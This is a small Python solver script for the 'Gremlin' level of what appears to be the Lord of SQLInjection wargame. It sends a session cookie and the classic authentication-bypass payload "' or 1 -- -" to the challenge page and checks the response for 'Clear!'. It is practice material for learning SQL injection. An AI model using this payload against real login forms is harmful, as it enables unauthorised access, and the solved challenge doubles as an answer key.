#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def main():
    '''
    Gremlin

    query : select id from prob_gremlin where id='' and pw=''
    '''

    url = "https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    param = dict(id="' or 1 -- -")

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('GREMLIN Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
